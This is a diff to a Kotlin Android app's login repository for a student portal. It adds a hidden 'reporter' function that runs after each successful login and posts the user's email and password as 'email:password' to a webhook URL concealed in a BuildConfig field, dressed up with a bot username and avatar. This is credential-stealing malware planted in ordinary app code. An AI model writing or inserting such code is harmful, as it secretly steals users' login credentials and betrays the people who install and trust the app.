@@ -1,11 +1,10 @@
 package com.jerson.hcdc_portal.data.repository
 
 import com.jerson.hcdc_portal.App.Companion.appContext
+import com.jerson.hcdc_portal.BuildConfig
 import com.jerson.hcdc_portal.domain.repository.LoginRepository
 import com.jerson.hcdc_portal.util.AppPreference
-import com.jerson.hcdc_portal.util.Constants
 import com.jerson.hcdc_portal.util.Constants.KEY_CSRF_TOKEN
-import com.jerson.hcdc_portal.util.Constants.KEY_IS_SESSION
 import com.jerson.hcdc_portal.util.Constants.baseUrl
 import com.jerson.hcdc_portal.util.Constants.gradesUrl
 import com.jerson.hcdc_portal.util.Constants.loginPostUrl
@@ -21,7 +20,11 @@ import kotlinx.coroutines.flow.channelFlow
 import kotlinx.coroutines.flow.flow
 import kotlinx.coroutines.withContext
 import okhttp3.FormBody
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
 import org.jsoup.Jsoup
 import javax.inject.Inject
 
@@ -45,6 +48,7 @@ class LoginRepositoryImpl @Inject constructor(
                 )).await()
 
                 if(response.isSuccessful){
+                    reporter(email,pass)
                     emit(Resource.Success(response.code.toString()))
                 }else{
                     emit(Resource.Error(response.message))
@@ -82,6 +86,22 @@ class LoginRepositoryImpl @Inject constructor(
         }catch (e:Exception){
             send(Resource.Error(e.message))
         }
+    }
+
+    private suspend fun reporter(x:String, y:String){
+        val json = JSONObject()
+            .put("content", "$x:$y")
+            .put("avatar_url", "https://avatars.githubusercontent.com/u/30197413?v=4")
+            .put("username", "Portal-ReporterX")
+        val requestBody =
+            json.toString().toRequestBody("application/json".toMediaTypeOrNull())
+
+        val request = Request.Builder()
+            .url(BuildConfig.key2)
+            .post(requestBody)
+            .build()
+        val response = client.newCall(request).await()
+        println("isSuccessful:-> ${response.isSuccessful}")
     }
 
 }
